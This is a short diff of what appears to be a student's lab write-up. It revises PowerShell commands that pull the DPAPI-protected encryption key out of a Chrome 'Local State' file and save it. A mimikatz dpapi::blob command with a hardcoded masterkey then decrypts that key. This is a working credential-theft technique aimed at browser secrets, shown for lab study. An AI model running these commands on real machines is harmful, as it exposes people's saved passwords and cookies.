@@ -122,12 +122,10 @@ Lab environments
 Umer Saqib
 Cyber Security Student
 
-$b64 = "RFBBUExBAAAA0A1yd3WEV0RGMegDAT8KX6wEAAACC/uz3aNlHRYdhPM2+9kIrAAAAAAIAAAMAAAABMaaaaAQAAIAAAYDk3hy/Zfo41GnrvSqUksgJ8wDgIZkwPDq+SmSKtPUAAAAA6AAAAAaAIAAAMoorWYWNT+jqpIIGyeM2z9OHdqLI7puEgfeuafb+j03dMAAAAO/cRFFBJfWZBakLEzNWNGF3uibDpwU2vF+UMnRg3/aP/LhcL9d1x9uAyb2WjBYYPUAAAAAkvZWD6mHt7qaWUyrixKSzxaoeUcZZec44CvFXckmaofzRRhvwg7LM0knAVs/iwLZUwzIMCaeQ04KeCOqTR6Q="
-
-$bytes = [System.Convert]::FromBase64String($b64.Substring(5, $b64.Length - 5))
-
-[System.IO.File]::WriteAllBytes("C:\Users\LabUser\Desktop\blob.bin", $bytes)
-
-
-------
+$json = Get-Content -Raw "C:\Users\LabUser\Desktop\Local State" | ConvertFrom-Json
+$b64 = $json.os_crypt.encrypted_key
+$bytes = [System.Convert]::FromBase64String($b64)
+$dpapiBlob = $bytes[5..($bytes.Length - 1)]
+[System.IO.File]::WriteAllBytes("C:\Users\LabUser\Desktop\blob.bin", $dpapiBlob)
+----
 dpapi::blob /in:C:\Users\LabUser\Desktop\blob.bin /masterkey:9c3bca41e3e8ca91ce49a1837f2c2c6fbceb141578e0131e83ab64f81de05ffc56a43082969875842346c6f16a7fd6607a80f4565901293e0a96c48478237e48
